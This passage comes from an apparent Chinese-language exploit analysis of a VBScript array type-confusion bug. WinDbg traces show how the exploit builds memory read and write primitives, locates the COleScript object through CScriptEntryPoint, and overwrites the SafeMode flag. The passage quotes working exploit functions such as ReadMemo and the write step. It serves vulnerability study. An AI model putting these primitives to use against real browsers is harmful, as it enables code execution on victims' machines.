    02e67908  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00  ................
    02e67918  08 00 49 02 a5 00 00 00-14 50 40 00 18 cc 49 02  ..I......P@...I.
    0:005> dd 00405014-4 L8
    00405010  00000018 08800001 00000001 00000000
    00405020  00000000 7fff0000 00000000 00000000
    0:005> g
    Breakpoint 1 hit
    eax=01df84f0 ebx=0249cc70 ecx=0249cc70 edx=00000002 esi=01e00910 edi=00000010
    eip=6fb02e64 esp=0249cb1c ebp=0249cc18 iopl=0         nv up ei pl nz na pe nc
    cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000206
    vbscript!AssignVar:
    6fb02e64 8bff            mov     edi,edi
    0:005> g
    Breakpoint 2 hit
    eax=0249cb2c ebx=0249cc70 ecx=0249cc70 edx=0000400c esi=00000001 edi=01e00900
    eip=6fb11f4c esp=0249cb00 ebp=0249cb18 iopl=0         nv up ei pl zr na pe nc
    cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
    vbscript!AccessArray:
    6fb11f4c 8bff            mov     edi,edi
    0:005> db 02e678e8 L40
    02e678e8  ef 6a d2 68 6c 4b 02 08-05 00 00 00 00 00 00 00  .j.hlK..........
    02e678f8  03 00 00 00 03 00 00 00-18 87 df 01 0e 0f 00 01  ................
    02e67908  00 00 00 00 00 00 00 00-05 00 00 00 00 00 00 00  ................
    02e67918  0c 20 00 00 0c 20 00 00-14 50 40 00 18 cc 49 02  . ... ...P@...I.
    0:005> dt ole32!tagSAFEARRAY 00405014
       +0x000 cDims            : 1
       +0x002 fFeatures        : 0x880
       +0x004 cbElements       : 1
       +0x008 cLocks           : 0
       +0x00c pvData           : (null) 
       +0x010 rgsabound        : [1] tagSAFEARRAYBOUND
我们知道字符串在内存中是以BSTR对象保存的，暂不论类型混淆，就myarray字符串而言，它在内存中的保存结果如下，Data
High字段中的指针0x00405014指向相应的字符内容：
 图4
内存中的myarray
其中，BSTR对象头部表示字符串的长度，此情况中即为poi(0x00405014-4)=0x18。
了解这一点后，我们再来看实现Read primitive的函数：
    function ReadMemo(add)  '借助类型混淆来读取add地址处的值'
      On Error Resume Next
      redim Preserve aa(a2)  '对aa数组进行corrupt'
      ab(0)=0
      aa(a1)=add+4
      ab(0)=1.69759663316747E-313  '0x0000000800000008'
      ReadMemo=lenb(aa(a1))  'read primitive'
      ab(0)=0
      redim Preserve aa(a0)  '恢复aa数组至corrupt前'
    end function
首先add+4会以long
integer(0x03)类型赋给aa(a1)，这里add为要读取的地址，而后aa(a1)的类型被改成了string(0x08)，于是add+4也就被当成了指向字符内容的指针，因此lenb(aa(a1))就等价于poi(add+4-4)，即add地址处的值。
对于Setnotsafemode函数中的如下ReadMemo调用：
    On Error Resume Next
    i=Mydata()  '获取testaa函数对象指针，即CScriptEntryPoint对象指针'
    i=ReadMemo(i+8)
其跟踪过程如下：
    0:005> g
    Breakpoint 1 hit
    eax=01df84e0 ebx=0249cc70 ecx=0249cc70 edx=00000060 esi=01e00900 edi=00000010
    eip=6fb02e64 esp=0249cb1c ebp=0249cc18 iopl=0         nv up ei pl nz na po nc
    cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000202
    vbscript!AssignVar:
    6fb02e64 8bff            mov     edi,edi
    0:005> dd esp L4
    0249cb1c  6fb13991 0013ebf0 02e678f8 01df84e0
    0:005> dd 01df84e0 L4
    01df84e0  00000003 00000000 01df8724 41a00001
    0:005> ln poi(01df8724)
    0:005> ln poi(01df8724-8)
    0:005> ln poi(01df8724-8-4)
    (6fb04934)   vbscript!CScriptEntryPoint::`vftable'   |  (6fb1ab54)   vbscript!CEntryPointDispatch::`vftable'
    Exact matches:
        vbscript!CScriptEntryPoint::`vftable' = 
    0:005> g
    Breakpoint 2 hit
    eax=0249cc10 ebx=0249cc70 ecx=0013f274 edx=0000400c esi=01e00910 edi=00000001
    eip=6fb11f4c esp=0249cb18 ebp=0249cc18 iopl=0         nv up ei pl zr na pe nc
    cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
    vbscript!AccessArray:
    6fb11f4c 8bff            mov     edi,edi
    0:005> db 02e678e8 L20
    02e678e8  ef 6a d2 68 6c 4b 02 08-02 00 00 00 00 00 00 00  .j.hlK..........
    02e678f8  03 00 00 00 00 00 00 00-24 87 df 01 01 00 a0 41  ........$......A
    0:005> g
    Breakpoint 1 hit
    eax=01df84e0 ebx=0249cc70 ecx=0249cc70 edx=00000002 esi=01e00910 edi=00000010
    eip=6fb02e64 esp=0249cb1c ebp=0249cc18 iopl=0         nv up ei pl nz na po nc
    cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000202
    vbscript!AssignVar:
    6fb02e64 8bff            mov     edi,edi
    0:005> g
    Breakpoint 2 hit
    eax=0249cb2c ebx=0249cc70 ecx=0249cc70 edx=0000400c esi=00000001 edi=01e00900
    eip=6fb11f4c esp=0249cb00 ebp=0249cb18 iopl=0         nv up ei pl zr na pe nc
    cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
    vbscript!AccessArray:
    6fb11f4c 8bff            mov     edi,edi
    0:005> db 02e678e8 L20
    02e678e8  ef 6a d2 68 6c 4b 02 08-05 00 00 00 00 00 00 00  .j.hlK..........
    02e678f8  08 00 00 00 08 00 00 00-24 87 df 01 01 00 a0 41  ........$......A
    0:005> g
    Breakpoint 1 hit
    eax=01df84f0 ebx=0249cc70 ecx=0249cc70 edx=00000000 esi=0249cbf8 edi=01df84f0
    eip=6fb02e64 esp=0249cb1c ebp=0249cc18 iopl=0         nv up ei pl nz na pe nc
    cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000206
    vbscript!AssignVar:
    6fb02e64 8bff            mov     edi,edi
    0:005> dd esp L4
    0249cb1c  6fb0cb42 0013ebf0 01df84f0 01df84e0
    0:005> dd 01df84e0 L4
    01df84e0  00000003 00000000 01df8648 00000000
    0:005> dd 01df8724-8-4 L8
    01df8718  6fb04934 00000001 01df8648 01e007f8
    01df8728  01e028bc 00000000 01df8648 0013ebf0
#### 3 修改SafeMode
最后我们再来看下exploit如何借助Write
primitive对SafeMode标志进行修改。由前面的分析可知此标志是vbscript!COleScript对象指针特定偏移处的一个值，而vbscript!COleScript对象指针又可以通过vbscript!CScriptEntryPoint对象指针得到，因此SafeMode标志的查找过程如下：
    0:005> ln poi(01df8718)
    (6fb04934)   vbscript!CScriptEntryPoint::`vftable'   |  (6fb1ab54)   vbscript!CEntryPointDispatch::`vftable'
    Exact matches:
        vbscript!CScriptEntryPoint::`vftable' = 
    0:005> dd 01df8718+8 L1
    01df8720  01df8648
    0:005> dd 01df8648+10 L1
    01df8658  01df75f0
    0:005> ln poi(01df75f0)
    (6fb04868)   vbscript!COleScript::`vftable'   |  (6fb1fdbc)   vbscript!`string'
    Exact matches:
        vbscript!COleScript::`vftable' = 
    0:005> dd 01df75f0+174 L4
    01df7764  0000000e 00000000 00000000 00000000
当找到此标志所在内存地址后，接下去就是对其进行修改，相关代码如下：
    if (j=14) then
      redim Preserve aa(a2)
      aa(a1+2)(i+&h11c+k)=ab(4)  'write primitive'
      redim Preserve aa(a0)
      exit for
    end if
我们来跟下这个过程：
    0:005> bl
     0 e 7664ec2c     0001 (0001)  0:**** OLEAUT32!SafeArrayRedim ".if(poi(poi(02e67900)-4)=0x0e){}.else{gc}"
     1 d 6fb02e64     0001 (0001)  0:**** vbscript!AssignVar
     2 d 6fb11f4c     0001 (0001)  0:**** vbscript!AccessArray
    0:005> g
    eax=0249cb14 ebx=004692e8 ecx=00000000 edx=00000060 esi=01df84e0 edi=01e00900
    eip=7664ec2c esp=0249cb00 ebp=0249cb1c iopl=0         nv up ei pl zr na pe nc
    cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
    OLEAUT32!SafeArrayRedim:
    7664ec2c 8bff            mov     edi,edi
    0:005> db 02e678e8 L20
    02e678e8  ef 6a d2 68 6c 4b 02 08-02 00 00 00 00 00 00 00  .j.hlK..........
    02e678f8  00 00 00 00 00 00 00 00-68 77 df 01 01 00 a0 41  ........hw.....A
    0:005> bp OLEAUT32!SafeArrayRedim